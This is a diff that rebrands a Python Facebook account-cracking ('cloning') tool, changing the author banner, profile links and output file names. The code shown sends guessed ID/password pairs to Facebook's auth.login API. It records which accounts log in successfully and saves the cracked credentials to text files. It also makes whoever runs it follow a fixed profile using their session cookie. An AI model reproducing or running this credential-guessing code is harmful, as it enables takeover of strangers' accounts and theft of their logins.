@@ -383,7 +383,7 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=SILENTHACKER0001', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100089999344678', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
@@ -399,12 +399,12 @@ SSSSS       SSSSS SSSSS SSSSS      SSSSSsS;:'  SSSSSsSS;:'     SsS     SSSSS SSS
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 \x1b[1;78m-------------------------
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
-\x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :   SILENT HACKER (SHR)      
-\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :    MR DEVIL
-\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   SILENT-786
-\x1b[1;98m[+] FROM        :   PAKISTAN, KPK, BANNU 
+\x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :   HACKING HELP PAID     
+\x1b[1;91m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   :    AZ SIR
+\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕      :   azsir
+\x1b[1;98m[+] FROM        :   BANGLADESH
 \x1b[1;93m[+] 𝗧𝗘𝗔𝗠        :   \33[1;42  APUN AKELA HI KAFI HAI\33[0m
-\x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  1.0.2    \x1b[1;97m          
+\x1b[1;94m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     :\x1b[1;97m  1.0.0   \x1b[1;97m          
 \033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
 """
  
@@ -433,7 +433,7 @@ class Main:
 			print("    Thanks♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.com/SILENTHACKER0001 ")
+			os.system("xdg-open https://www.facebook.com/100089999344678 ")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    CHECKING APPROVAL ")
@@ -449,7 +449,7 @@ class Main:
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;32m[1]\033[0;92m File Cloning ")
 		print(" \033[1;32m[2] Public Cloning")
-		print(" \33[1;32m[3] Pak Random Cloning")
+		print(" \33[1;32m[3] BAN RANDOM CLONING")
 		print(" \033[1;32m[4] 2006 To 2012 ")
 		print(" \33[1;32m[5] 2004 To 2008 ")
 		print("\033[1;32m [E] Exit \n")
@@ -1317,13 +1317,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[MR_DEVIL-OK] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[AZ-sir] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("MR_DEVIL-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("AZ-sir.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[MR_DEVIL-OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[AZ-sir] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
